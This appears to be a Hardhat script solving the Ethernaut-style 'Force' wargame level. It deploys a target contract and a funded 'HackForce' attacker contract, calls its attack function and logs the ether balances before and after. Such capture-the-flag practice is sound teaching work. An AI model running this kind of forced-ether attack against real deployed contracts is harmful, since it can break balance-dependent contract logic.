const hre = require('hardhat')

async function main() {
  const Force = await hre.ethers.getContractFactory('Force')
  const force = await Force.deploy()
  await force.deployed()
  console.log(`Force deployed to ${force.address}`)

  const HackForce = await hre.ethers.getContractFactory('HackForce')
  const hackForce = await HackForce.deploy({
    value: ethers.utils.parseUnits('1.0', 'ether'),
  })
  await hackForce.deployed()
  console.log(`HackForce deployed to ${hackForce.address}`)

  console.log(
    `HackForce balance = ${ethers.utils.formatEther(
      await ethers.provider.getBalance(hackForce.address),
    )} ETH`,
  )
  console.log(
    `Force balance = ${ethers.utils.formatEther(
      await ethers.provider.getBalance(force.address),
    )} ETH`,
  )

  await hackForce.attack(force.address)

  console.log(
    `New HackForce balance = ${ethers.utils.formatEther(
      await ethers.provider.getBalance(hackForce.address),
    )} ETH`,
  )
  console.log(
    `New Force balance = ${ethers.utils.formatEther(
      await ethers.provider.getBalance(force.address),
    )} ETH`,
  )
}

main().catch((error) => {
  console.error(error)
  process.exitCode = 1
})
